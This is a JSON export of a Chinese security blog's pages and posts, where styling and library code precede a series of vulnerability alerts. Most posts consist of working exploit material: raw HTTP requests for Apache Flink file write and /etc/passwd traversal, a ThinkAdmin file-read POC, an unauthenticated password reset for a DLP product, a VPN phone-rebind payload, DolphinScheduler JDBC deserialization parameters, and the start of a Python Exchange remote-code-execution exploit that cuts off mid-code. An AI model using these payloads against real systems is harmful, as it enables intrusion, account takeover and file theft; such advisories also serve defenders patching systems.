{"meta":{"title":"YGnight's blog","subtitle":"","description":"","author":"YGnight","url":"https://yejinpoxiao.xyz","root":"/"},"pages":[{"title":"资料信息","date":"2019-12-12T08:50:07.000Z","updated":"2020-05-28T03:37:02.444Z","comments":true,"path":"about/index.html","permalink":"https://yejinpoxiao.xyz/about/index.html","excerpt":"","text":"YGnight 原夜尽破晓团队队长"},{"title":"archives","date":"2019-12-12T08:50:14.000Z","updated":"2019-12-12T08:50:14.037Z","comments":true,"path":"archives/index.html","permalink":"https://yejinpoxiao.xyz/archives/index.html","excerpt":"","text":""},{"title":"文章分类","date":"2019-12-12T09:24:10.553Z","updated":"2019-12-12T09:24:10.553Z","comments":true,"path":"categories/index.html","permalink":"https://yejinpoxiao.xyz/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-12-12T08:50:35.000Z","updated":"2019-12-12T09:23:45.384Z","comments":true,"path":"tags/index.html","permalink":"https://yejinpoxiao.xyz/tags/index.html","excerpt":"","text":""},{"title":"","date":"2021-09-30T02:21:17.778Z","updated":"2021-09-27T21:40:14.000Z","comments":true,"path":"guoqing/css/jqery.css","permalink":"https://yejinpoxiao.xyz/guoqing/css/jqery.css","excerpt":"","text":".animated{-webkit-animation-duration:1s;animation-duration:1s;-webkit-animation-fill-mode:both;animation-fill-mode:both}@-webkit-keyframes bounceInDown{0%,60%,75%,90%,to{-webkit-animation-timing-function:cubic-bezier(.215,.61,.355,1);animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;-webkit-transform:translate3d(0,-3000px,0);transform:translate3d(0,-3000px,0)}60%{opacity:1;-webkit-transform:translate3d(0,25px,0);transform:translate3d(0,25px,0)}75%{-webkit-transform:translate3d(0,-10px,0);transform:translate3d(0,-10px,0)}90%{-webkit-transform:translate3d(0,5px,0);transform:translate3d(0,5px,0)}to{-webkit-transform:translateZ(0);transform:translateZ(0)}}@keyframes bounceInDown{0%,60%,75%,90%,to{-webkit-animation-timing-function:cubic-bezier(.215,.61,.355,1);animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;-webkit-transform:translate3d(0,-3000px,0);transform:translate3d(0,-3000px,0)}60%{opacity:1;-webkit-transform:translate3d(0,25px,0);transform:translate3d(0,25px,0)}75%{-webkit-transform:translate3d(0,-10px,0);transform:translate3d(0,-10px,0)}90%{-webkit-transform:translate3d(0,5px,0);transform:translate3d(0,5px,0)}to{-webkit-transform:translateZ(0);transform:translateZ(0)}}.bounceInDown{-webkit-animation-name:bounceInDown;animation-name:bounceInDown}@-webkit-keyframes pulse{0%{-webkit-transform:scaleX(1);transform:scaleX(1)}50%{-webkit-transform:scale3d(1.05,1.05,1.05);transform:scale3d(1.05,1.05,1.05)}to{-webkit-transform:scaleX(1);transform:scaleX(1)}}@keyframes pulse{0%{-webkit-transform:scaleX(1);transform:scaleX(1)}50%{-webkit-transform:scale3d(1.05,1.05,1.05);transform:scale3d(1.05,1.05,1.05)}to{-webkit-transform:scaleX(1);transform:scaleX(1)}}.pulse{-webkit-animation-name:pulse;animation-name:pulse;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite}@-webkit-keyframes right-top{0%{-webkit-transform:translate3d(.25rem,-.25rem,0);transform:translate3d(.25rem,-.25rem,0)}50%{-webkit-transform:translate3d(.5rem,-1rem,0);transform:translate3d(.5rem,-1rem,0)}to{-webkit-transform:translate3d(.25rem,-.25rem,0);transform:translate3d(.25rem,-.25rem,0)}}@keyframes right-top{0%{-webkit-transform:translate3d(.25rem,-.25rem,0);transform:translate3d(.25rem,-.25rem,0)}50%{-webkit-transform:translate3d(.5rem,-1rem,0);transform:translate3d(.5rem,-1rem,0)}to{-webkit-transform:translate3d(.25rem,-.25rem,0);transform:translate3d(.25rem,-.25rem,0)}}.right-top{-webkit-animation-name:right-top;animation-name:right-top;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite}@-webkit-keyframes left-btm{0%{-webkit-transform:translate3d(-.25rem,.25rem,0) rotate(180deg);transform:translate3d(-.25rem,.25rem,0) rotate(180deg)}50%{-webkit-transform:translate3d(-.5rem,1rem,0) rotate(180deg);transform:translate3d(-.5rem,1rem,0) rotate(180deg)}to{-webkit-transform:translate3d(-.25rem,.25rem,0) rotate(180deg);transform:translate3d(-.25rem,.25rem,0) rotate(180deg)}}@keyframes left-btm{0%{-webkit-transform:translate3d(-.25rem,.25rem,0) rotate(180deg);transform:translate3d(-.25rem,.25rem,0) rotate(180deg)}50%{-webkit-transform:translate3d(-.5rem,1rem,0) rotate(180deg);transform:translate3d(-.5rem,1rem,0) rotate(180deg)}to{-webkit-transform:translate3d(-.25rem,.25rem,0) rotate(180deg);transform:translate3d(-.25rem,.25rem,0) rotate(180deg)}}.left-btm{-webkit-animation-name:left-btm;animation-name:left-btm;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite}article,body,div,h1,h2,h3,html,i,img,p,section,span{margin:0;padding:0;-webkit-box-sizing:border-box;box-sizing:border-box}body,html{font-size:16px;line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,Helvetica Neue,Arial,PingFang SC,Hiragino Sans GB,STHeiti,Microsoft YaHei,Microsoft JhengHei,Source Han Sans SC,Noto Sans CJK SC,Source Han Sans CN,Noto Sans SC,Source Han Sans TC,Noto Sans CJK TC,WenQuanYi Micro Hei,SimSun,sans-serif;background-color:#fff}.icon{display:inline-block}.txt-ellipsis{display:block;white-space:nowrap}.txt-ellipsis,.txt-ellipsis-two{text-overflow:ellipsis;overflow:hidden}.txt-ellipsis-two{display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:2;word-break:break-all}.flex-hcenter{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.flex-hcenter,.flex-vcenter{display:-webkit-box;display:-ms-flexbox;display:flex}.flex-vcenter{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.g-vcenter{position:absolute;top:50%;-webkit-transform:translateY(-50%);transform:translateY(-50%)}.g-hcenter{-webkit-transform:translateX(-50%);transform:translateX(-50%)}.g-center,.g-hcenter{position:absolute;left:50%}.g-center{top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%)}.g-flex-center{-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column}.center,.g-flex-center,.long-press,.long-press .l-img,.long-press .l-tips,.operation-box,.operation-btns,.operation-header{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}#app,body,html{min-height:100%;width:100%;-webkit-touch-callout:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.wrapper{position:relative;overflow-x:hidden;width:100%;min-height:100vh;max-width:500px;margin:0 auto;background-image:url(../img/20190829-bg.png);background-repeat:no-repeat;background-size:cover}.operation-number{margin-top:.4rem;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;text-align:center;color:#fff;font-size:14px}.operation-number span{display:inline-block;padding:1px 5px;border-radius:25px;background-color:#ea4727;color:#feee92}.operation-header{margin-top:1.8rem;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column}.operation-header div{background-size:contain;background-repeat:no-repeat}.operation-header .h-logo{text-align:center}.operation-header .h-logo img{height:1.5rem}.operation-header .h-title{margin-top:.5rem;width:13.125rem;height:6.3rem;background-image:url(../img/20190906-logo2.png)}.operation-header .h-slogan{margin-top:.125rem;width:9.35rem;height:1.05rem;background-image:url(../img/20190906-logo3.png)}.operation-box{margin-top:.5rem}.operation-box .next,.operation-box .prev{background-image:url(../img/20190829-btn.png);background-size:contain;border-radius:50%;width:2.275rem;height:2.275rem}.operation-box .prev{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.operation-box .operation-img{margin:0 .75rem;background:#fff;border:.25rem solid #fbe6b5;border-radius:.75rem;font-size:0}.operation-box .operation-img .cropper-content{border-radius:.5rem;position:relative;width:9.5rem;height:9.5rem;margin-left:50%;-webkit-transform:translateX(-50%);transform:translateX(-50%);overflow:hidden}.operation-box .operation-img .cropper-content .vue-cropper{background:#d8d8d8}.operation-btns{-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;margin-top:.75rem}.operation-btns .o-btn{background-size:100% 100%}.operation-btns .o-btn1{width:11.6rem;height:3.325rem;background-image:url(../img/btn1.png)}.operation-btns .o-btn2{position:relative;width:11.6rem;height:3.75rem;background-image:url(../img/save-btn.png)}.operation-btns .o-btn3{width:11.625rem;height:3.75rem;background-image:url(../img/btn3.png)}.operation-tips{text-align:center}.operation-tips p{background-image:radial-gradient(circle at 7% 0,#fff,#feff74);font-size:14px;font-weight:400;font-style:normal;font-stretch:normal;line-height:normal;letter-spacing:1.7px;text-align:center;-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}.operation-logo{text-align:center}.operation-logo img{height:1rem}.operation-done{text-align:center}.operation-done .act-done-text{margin:1.25rem 0 2rem;height:.75rem}.operation-done .act-done-happy{margin-bottom:2.5rem;height:5.15rem}@media screen and (min-height:600px){.operation-box{margin-top:1rem;margin-bottom:1rem}}@media screen and (min-height:700px){.operation-box{margin-top:1.5rem;margin-bottom:1.5rem}.operation-btns{margin-bottom:.5rem}.operation-header .h-logo{margin-top:.75rem}.operation-header .h-title{margin-top:1rem}}.cropper-drag-box{position:relative;z-index:9999999}.frame-image{position:absolute;right:0;bottom:0;z-index:999;width:100%;height:100%}.van-popup{background-color:hsla(0,0%,100%,0)}.long-press{-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;width:12.975rem;height:16.25rem;background-image:url(../img/20190829-longpress.svg);background-size:cover}.long-press .l-img{width:100%;height:13.375rem}.long-press .l-img img{width:10.7rem;height:10.7rem}.long-press .l-tips{-webkit-box-flex:1;-ms-flex:1;flex:1;font-size:1rem;font-weight:700}.first-tips{position:relative;margin-top:18.25rem;margin-left:50%;-webkit-transform:translate3d(-50%,-50%,0);transform:translate3d(-50%,-50%,0);width:4.575rem;height:6.975rem}.first-tips .center-bg{position:absolute;left:0;top:0;width:4.575rem;height:6.975rem;background-size:contain}.first-tips .top-arrow{right:0;top:0}.first-tips .bottom-arrow,.first-tips .top-arrow{position:absolute;width:.825rem;height:px22rem(41)}.first-tips .bottom-arrow{left:0;bottom:0}.first-text{color:#fff;font-size:20px;text-align:center}.cropper-box-canvas{width:132px;height:132px;-webkit-transform:scale(1.43939) translate3d(20.1474px,20.1474px,0) rotate(0deg);transform:scale(1.43939) translate3d(20.1474px,20.1474px,0) rotate(0deg)}.cropper-box-canvas img{width:100%}.fade-enter-active,.fade-leave-active{-webkit-transition:opacity .5s;transition:opacity .5s}.fade-enter,.fade-leave-to{opacity:0}"},{"title":"","date":"2021-09-30T02:21:17.782Z","updated":"2021-09-27T21:40:10.000Z","comments":true,"path":"guoqing/js/fabric.min.js","permalink":"https://yejinpoxiao.xyz/guoqing/js/fabric.min.js","excerpt":"","text":"function resizeCanvasIfNeeded(t){var e=t.targetCanvas,i=e.width,r=e.height,n=t.destinationWidth,s=t.destinationHeight;i===n&&r===s||(e.width=n,e.height=s)}function copyGLTo2DDrawImage(t,e){var i=t.canvas,r=e.targetCanvas,n=r.getContext(\"2d\");n.translate(0,r.height),n.scale(1,-1);var s=i.height-r.height;n.drawImage(i,0,s,r.width,r.height,0,0,r.width,r.height)}function copyGLTo2DPutImageData(t,e){var i=e.targetCanvas.getContext(\"2d\"),r=e.destinationWidth,n=e.destinationHeight,s=r*n*4,o=new Uint8Array(this.imageBuffer,0,s),a=new Uint8ClampedArray(this.imageBuffer,0,s);t.readPixels(0,0,r,n,t.RGBA,t.UNSIGNED_BYTE,o);var h=new ImageData(a,r,n);i.putImageData(h,0,0)}var fabric=fabric||{version:\"2.0.0-rc.3\"};\"undefined\"!=typeof exports&&(exports.fabric=fabric),\"undefined\"!=typeof document&&\"undefined\"!=typeof window?(fabric.document=document,fabric.window=window):(fabric.document=require(\"jsdom\").jsdom(decodeURIComponent(\"%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3C%2Fhead%3E%3Cbody%3E%3C%2Fbody%3E%3C%2Fhtml%3E\"),{features:{FetchExternalResources:[\"img\"]}}),fabric.jsdomImplForWrapper=require(\"jsdom/lib/jsdom/living/generated/utils\").implForWrapper,fabric.window=fabric.document.defaultView,DOMParser=require(\"xmldom\").DOMParser),fabric.isTouchSupported=\"ontouchstart\"in fabric.window,fabric.isLikelyNode=\"undefined\"!=typeof Buffer&&\"undefined\"==typeof window,fabric.SHARED_ATTRIBUTES=[\"display\",\"transform\",\"fill\",\"fill-opacity\",\"fill-rule\",\"opacity\",\"stroke\",\"stroke-dasharray\",\"stroke-linecap\",\"stroke-linejoin\",\"stroke-miterlimit\",\"stroke-opacity\",\"stroke-width\",\"id\",\"paint-order\",\"instantiated_by_use\"],fabric.DPI=96,fabric.reNum=\"(?:[-+]?(?:\\\\d+|\\\\d*\\\\.\\\\d+)(?:e[-+]?\\\\d+)?)\",fabric.fontPaths={},fabric.iMatrix=[1,0,0,1,0,0],fabric.canvasModule=\"canvas\",fabric.perfLimitSizeTotal=2097152,fabric.maxCacheSideLimit=4096,fabric.minCacheSideLimit=256,fabric.charWidthsCache={},fabric.textureSize=2048,fabric.enableGLFiltering=!0,fabric.devicePixelRatio=fabric.window.devicePixelRatio||fabric.window.webkitDevicePixelRatio||fabric.window.mozDevicePixelRatio||1,fabric.browserShadowBlurConstant=1,fabric.initFilterBackend=function(){return fabric.enableGLFiltering&&fabric.isWebglSupported&&fabric.isWebglSupported(fabric.textureSize)?(console.log(\"max texture size: \"+fabric.maxTextureSize),new fabric.WebglFilterBackend({tileSize:fabric.textureSize})):fabric.Canvas2dFilterBackend?new fabric.Canvas2dFilterBackend:void 0},\"undefined\"!=typeof document&&\"undefined\"!=typeof window&&(window.fabric=fabric),function(){function t(t,e){if(this.__eventListeners[t]){var i=this.__eventListeners[t];e?i[i.indexOf(e)]=!1:fabric.util.array.fill(i,!1)}}function e(t,e){if(this.__eventListeners||(this.__eventListeners={}),1===arguments.length)for(var i in t)this.on(i,t[i]);else this.__eventListeners[t]||(this.__eventListeners[t]=[]),this.__eventListeners[t].push(e);return this}function i(e,i){if(this.__eventListeners){if(0===arguments.length)for(e in this.__eventListeners)t.call(this,e);else if(1===arguments.length&&\"object\"==typeof arguments[0])for(var r in e)t.call(this,r,e[r]);else t.call(this,e,i);return this}}function r(t,e){if(this.__eventListeners){var i=this.__eventListeners[t];if(i){for(var r=0,n=i.length;rr?i-=r:i=0);var n,s,o=!0,a=t.getImageData(e,i,2*r||1,2*r||1),h=a.data.length;for(n=3;n"}],"posts":[{"title":"Apache Flink目录遍历漏洞(CVE-2020-17518/CVE-2020-17519)","slug":"Apache Flink目录遍历漏洞(CVE-2020-17518CVE-2020-17519)","date":"2021-01-06T06:57:21.273Z","updated":"2021-01-06T07:06:05.044Z","comments":true,"path":"2021/01/06/Apache Flink目录遍历漏洞(CVE-2020-17518CVE-2020-17519)/","link":"","permalink":"https://yejinpoxiao.xyz/2021/01/06/Apache%20Flink%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E(CVE-2020-17518CVE-2020-17519)/","excerpt":"","text":"漏洞概述2021年1月5日，Apache官网通报了Apache Flink目录遍历漏洞，可通过REST API读/写远程文件。 CVE-2020-17518:构造恶意http header，可实现远程文件写入。Flink1.5.1引入了一个REST处理程序，允许您编写文件到本地文件系统上的任意位置。 CVE-2020-17519:通过REST API使用../跳目录实现系统任意文件读取。Apache Flink 1.11.0-1.11.2中引入的一项更改，允许攻击者通过JobManager进程的REST接口读取本地文件系统上的任何文件，访问仅限于JobManager进程可访问的文件。 影响版本CVE-2020-17518：Flink 1.5.1 - 1.11.2 CVE-2020-17519：Flink 1.11.0 、1.11.1 、1.11.2 漏洞利用Exploit:cve-2020-17518: 123456789101112131415POST /jars/upload HTTP/1.1Host: localhostAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6YContent-Length: 187------WebKitFormBoundaryoZ8meKnrrso89R6YContent-Disposition: form-data; name=\"exploit\"; filename=\"../../../../../../tmp/exploit\"exploit------WebKitFormBoundaryoZ8meKnrrso89R6Y-- cve-2020-17519： 1*/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd 安全建议升级Apache Flink至安全版本Flink 1.11.3或Flink 1.12.0。","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"深x服SSL VPN命令注入漏洞","slug":"深X服SSL VPN命令注入漏洞","date":"2020-12-31T02:29:07.449Z","updated":"2020-12-31T02:44:56.952Z","comments":true,"path":"2020/12/31/深X服SSL VPN命令注入漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2020/12/31/%E6%B7%B1X%E6%9C%8DSSL%20VPN%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"漏洞概述2020年12月30日，网上发布了SSL VPN 命令注入漏洞的风险通告，该漏洞暂无编号 ，漏洞等级：高危 深信服SSL VPN产品的某接口中url参数存在注入漏洞，攻击者可利用该漏洞获取SSL VPN设备的控制权限。 影响版本深信服:SSL VPN: &lt;=7.6.7 修复建议升级到SSL VPN 7.6.7以上版本或安装最新安全补丁包，用户可以利用深信服提供的漏洞查询链接进行自查：漏洞查询入口","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"告警信息","slug":"告警信息","permalink":"https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"}]},{"title":"Thinkadmin v6任意文件读取漏洞(CVE-2020-25540)","slug":"Thinkadmin v6任意文件读取漏洞(CVE-2020-25540)","date":"2020-09-25T03:19:47.392Z","updated":"2020-09-25T04:18:23.969Z","comments":true,"path":"2020/09/25/Thinkadmin v6任意文件读取漏洞(CVE-2020-25540)/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/25/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2020-25540)/","excerpt":"","text":"产品介绍ThinkAdmin 是一套基于ThinkPHP框架的通用后台管理系统,依赖自制组件 ThinkLibrary ，ThinkLibrary 是针对 ThinkPHP 定制开发。 漏洞原理ThinkAdmin 6版本存在路径遍历漏洞。攻击者可利用该漏洞通过GET请求编码参数任意读取远程服务器上的文件。 https://github.com/zoujingli/ThinkAdmin/blob/v6/app/admin/controller/api/Update.php Update.php中的函数方法未授权，导致函数可直接调用。 影响范围Thinkadmin版本 ≤ 2020.08.03.01 利用POC 12345678POST /admin.html?s=admin/api.Update/node HTTP/1.1Host: 127.0.0.1Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 22rules=%5B%22.%2F%22%5D","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"天X信数据防泄漏系统越权修改密码漏洞","slug":"天X信数据防泄漏系统越权修改密码漏洞","date":"2020-09-18T16:37:04.339Z","updated":"2020-09-18T16:47:32.965Z","comments":true,"path":"2020/09/19/天X信数据防泄漏系统越权修改密码漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/19/%E5%A4%A9X%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"产品概述天X信网络数据防泄漏系统（TopDLP-N）以深度内容识别技术为核心，采用独有的网络抓包技术、数据深度分析、协议内容解析、文件内容还原等技术、综合运用各种先进的检测算法，对单位内部用户邮件客户端（SMTP）、浏览器（HTTP/S）、FTP客户端（FTP）、网络共享（SMB）等途径传输的数据进行解析和内容提取，识别敏感数据，依据预先定义策略执行防护措施，进而达到敏感数据防护的目的。 利用由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd 接口未授权访问,造成直接修改任意用户密码。 默认superman账户uid为1。 12345POST /?module=auth_user&amp;action=mod_edit_pwd Cookie: username=superman;uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"深x服某PN存在任意重置绑定手机号漏洞","slug":"深X服某PN存在任意重置绑定手机号漏洞","date":"2020-09-18T02:16:37.010Z","updated":"2020-09-18T02:28:57.797Z","comments":true,"path":"2020/09/18/深X服某PN存在任意重置绑定手机号漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/18/%E6%B7%B1X%E6%9C%8D%E6%9F%90PN%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E9%87%8D%E7%BD%AE%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA%E5%8F%B7%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"payload条件：需要登录 1https://url/por/changetelnum.csp?apiversion=1newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"告警信息","slug":"告警信息","permalink":"https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"}]},{"title":"Wordpress File-manager 任意文件上传漏洞","slug":"Wordpress File-manager 任意文件上传漏洞","date":"2020-09-18T02:02:09.792Z","updated":"2020-09-18T02:13:18.858Z","comments":true,"path":"2020/09/18/Wordpress File-manager 任意文件上传漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/18/Wordpress%20File-manager%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"File Manager 插件介绍WordPress文件管理器插件File Manager 为您提供编辑、删除、上载、下载、复制和粘贴文件和文件夹的功能。您可以轻松地将文件夹或任何文件从一个位置复制，移动到另一个位置。File Manager 插件分为免费版本和收费版本 影响范围file manager 6.0-6.8 利用上传phpinfo 访问http://127.0.0.1/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"告警信息","slug":"告警信息","permalink":"https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"}]},{"title":"两个Apache DolphinScheduler高危漏洞","slug":"两个Apache DolphinScheduler高危漏洞 ","date":"2020-09-18T01:46:10.895Z","updated":"2020-09-18T02:02:03.836Z","comments":true,"path":"2020/09/18/两个Apache DolphinScheduler高危漏洞 /","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/18/%E4%B8%A4%E4%B8%AAApache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%20/","excerpt":"","text":"产品概述Apache DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调度系统，主要解决数据研发ETL错综复杂的依赖关系，不能直观监控任务健康状态。DolphinScheduler以DAG流式的方式将Task组装起来，可实时监控任务的运行状态，同时支持重试、从指定节点恢复失败、暂停及Kill任务等操作。 一、Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）详情该漏洞导致普通用户可通过api interface在DolphinScheduler 系统中覆盖其他用户的密码：api interface /dolphinscheduler/users/update。 影响范围Apache DolphinScheduler 1.2.0 Apache DolphinScheduler 1.2.1 Apache DolphinScheduler 1.3.1 利用该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。 1、登录到面板 -&gt; 数据源中心。 2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。 3、将以下数据添加到jdbc连接参数中,就可以直接触发。 123456789POST /dolphinscheduler/datasources/connect HTTP/1.1......type=MYSQL&amp;name=test&amp;note=&amp;host=127.0.0.1&amp;port=3306&amp;database=test&amp;principal=&amp;userName=root&amp;password=root&amp;connectType=&amp;other=&#123;\"detectCustomCollations\":true,\"autoDeserialize\":true&#125; 二、Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974）详情该漏洞与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc connect参数输入{“detectCustomCollations”:true,”autoDeserialize”:true}在DolphinScheduler 服务器上远程执行代码。 影响范围Apache DolphinScheduler 1.2.0 Apache DolphinScheduler 1.2.1 修复尽快升级版本至1.3.2进行防护，官方下载链接： https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"Exchange Server 远程代码执行漏洞(CVE-2020-16875)","slug":"Exchange Server 远程代码执行漏洞(CVE-2020-16875)","date":"2020-09-18T01:31:22.608Z","updated":"2020-09-18T02:34:27.862Z","comments":true,"path":"2020/09/18/Exchange Server 远程代码执行漏洞(CVE-2020-16875)/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/18/Exchange%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-16875)/","excerpt":"","text":"详情由于对cmdlet参数的验证不正确，Microsoft Exchange服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用户的上下文中运行任意代码。利用此漏洞需要拥有以某个Exchange角色进行身份验证的用户权限。 影响版本microsoft:exchange_server_2016: cu16/cu17 microsoft:exchange_server_2019: cu5/cu6 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import reimport sysimport randomimport stringimport urllib3import requestsurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)def random_string(str_len=8): letters = string.ascii_lowercase return ''.join(random.choice(letters) for i in range(str_len))def get_xml(c): return \"\"\"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;dlpPolicyTemplates&gt; &lt;dlpPolicyTemplate id=\"F7C29AEC-A52D-4502-9670-141424A83FAB\" mode=\"Audit\" state=\"Enabled\" version=\"15.0.2.0\"&gt; &lt;contentVersion&gt;4&lt;/contentVersion&gt; &lt;publisherName&gt;si&lt;/publisherName&gt; &lt;name&gt; &lt;localizedString lang=\"en\"&gt;&lt;/localizedString&gt; &lt;/name&gt; &lt;description&gt; &lt;localizedString lang=\"en\"&gt;&lt;/localizedString&gt; &lt;/description&gt; &lt;keywords&gt;&lt;/keywords&gt; &lt;ruleParameters&gt;&lt;/ruleParameters&gt; &lt;policyCommands&gt; &lt;commandBlock&gt; &lt;![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName=\"cmd\";$i.Arguments=\"/c %s\";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start() ]]&gt; &lt;/commandBlock&gt; &lt;/policyCommands&gt; &lt;policyCommandsResources&gt;&lt;/policyCommandsResources&gt; &lt;/dlpPolicyTemplate&gt;&lt;/dlpPolicyTemplates&gt;\"\"\" % cdef trigger_rce(t, s, vs, cmd): f = &#123; '__VIEWSTATE': (None, vs), 'ctl00$ResultPanePlaceHolder$senderBtn': (None, \"ResultPanePlaceHolder_ButtonsPanel_btnNext\"), 'ctl00$ResultPanePlaceHolder$contentContainer$name': (None, random_string()), 'ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl': (\"dlprce.xml\", get_xml(cmd)), &#125; r = 